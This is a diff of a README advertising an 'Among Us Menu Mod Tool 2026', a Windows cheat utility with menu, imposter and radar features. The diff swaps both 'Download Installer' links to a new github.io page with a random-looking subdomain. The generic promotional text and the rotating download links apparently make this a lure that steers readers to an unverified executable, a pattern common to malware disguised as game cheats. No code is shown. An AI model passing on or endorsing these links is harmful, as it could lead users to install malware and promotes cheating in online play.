@@ -2,7 +2,7 @@
 
 Among Us Menu Mod Tool 2026 is a powerful desktop application designed to enhance your Among Us experience on Windows. This tool provides easy access to various features like menu, imposter, and radar utilities, ensuring a more enjoyable gameplay. Updated for the latest version in 2026, it offers seamless integration with the game.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -57,7 +57,7 @@ A: For support, visit our GitHub repository or contact the development team via 
 
 For the latest version of the Among Us Menu Mod Tool 2026, please visit the download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Disclaimer
 
